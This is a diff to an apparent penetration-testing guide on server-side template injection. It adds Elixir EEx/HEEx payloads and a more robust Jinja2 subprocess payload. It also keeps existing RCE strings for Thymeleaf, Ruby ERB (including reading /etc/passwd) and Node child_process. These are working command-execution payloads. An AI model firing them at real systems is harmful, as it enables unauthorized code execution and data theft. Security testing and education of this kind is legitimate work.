@@ -126,6 +126,7 @@ Use a systematic approach based on the initial observations or a decision tree (
 | **Nunjucks** (Node/Mozilla)      | Mozilla's Jinja2 port, `.njk` templates             | Prototype chain to `Function` or `require`                        |
 | **Handlebars** (Node)            | `{{this}}`, `{{@root}}` work                        | Limited RCE; requires unsafe helpers or prototype pollution       |
 | **Thymeleaf 3.1+** (Java/Spring) | `th:text="${...}"`, Spring Boot stack traces        | `${T(java.lang.Runtime).getRuntime().exec('id')}` if SpEL enabled |
+| **EEx/HEEx/LEEx** (Elixir/Phoenix) | `<%= %>` tags, `EEx`/`Phoenix.Template` in stack traces | `<%= elem(System.shell("id"), 0) %>`                              |
 
 #### Variable Probing
 
@@ -168,6 +169,12 @@ Modern WAFs often filter quotes and common keyword tokens. 2025 research showed 
 
 ```jinja
 {{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}
+```
+
+Numeric subclass indices like `[104]` are fragile — the position of `subprocess.Popen` shifts between CPython versions and across imported modules. Prefer the index-free form that iterates and matches by name:
+
+```jinja
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "Popen" in x.__name__ %}{{ x('id',shell=True,stdout=-1).communicate() }}{% endif %}{% endfor %}
 ```
 
 For Node templating (EJS/Pug/Handlebars server-side), prefer prototype traversal to reach `Function` or `require` when helpers expose evaluation sinks:
@@ -262,6 +269,11 @@ Common vulnerable patterns include:
   - `<%= system("whoami") %>`
   - `<%= Dir.entries('/') %>`
   - `<%= File.open('/etc/passwd').read %>`
+- EEx / HEEx / LEEx (Elixir / Phoenix — same `<%= %>` tag syntax; HEEx/LEEx are the Phoenix HTML/LiveView variants):
+  - Detect: `<%= 7*7 %>` -> `49`
+  - RCE: `<%= elem(System.shell("id"), 0) %>`
+  - Error-based (forces command output into a type error reflected in the stack trace): `<%= [1,2][elem(System.shell("id"),0)] %>`
+  - Time-based blind: `<%= elem(System.shell("id && sleep 5"),0) %>`
 - Node.js (Various engines):
   - `{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}`
   - Payloads often involve traversing prototypes (`this.__proto__`) to reach `constructor` and eventually `Function` or `require`. See PayloadAllTheThings / Hacker Recipes for detailed Node examples.
